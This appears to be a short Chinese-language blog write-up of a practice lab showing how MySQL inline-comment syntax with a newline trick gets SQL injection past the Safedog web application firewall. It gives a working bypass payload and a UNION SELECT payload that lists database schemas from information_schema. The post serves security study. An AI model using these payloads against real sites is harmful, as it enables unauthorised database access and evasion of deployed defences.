---
title: "SQL 注入绕过 WAF"
date: 2024-03-06
description: "用内联注释绕过最新版安全狗拦截"
tags: ["SQL 注入","后端漏洞"]
featured_image: ""
# images is optional, but needed for showing Twitter Card
images: []
categories: "sec"
comment: false
draft: false
---

这个靶场演示的是最新版安全狗。

我们输入单引号，and，等号之类的字符都会被拦截。

![sqli9](/images/sqli1/sqli9-1.png)

利用内联注释构造如下 payload，即可成功绕过这个拦截。

    ?id=1/*!50001-- qwe/*%0Aand 1=1*/

其中 /*!50001 something */ 是 mysql 的内联注释，意思是当版本大于等于 5.00.01 则执行注释内语句。 

-- qwe 注释了 / * 因为 -- qwe 是单行注释，因此当遇到 %0a 换行时就不会再接着注释了。其中因为 1=1 写在/ * * /里面，WAF认为他是一个注释，所以不会管，但其实我们已经注释了，而这个 / * 结尾的 * / 是闭合开始时的 / * !

![sqli9](/images/sqli1/sqli9-0.png)

随后提取 flag 即可，此处从略。

    ?id=1/*!50001-- qwe/*%0Aand 1=2 union select 1,1,schema_name from information_schema.schemata limit 0,1*/

![sqli9](/images/sqli1/sqli9-2.png)

![sqli9](/images/sqli1/sqli9-3.png)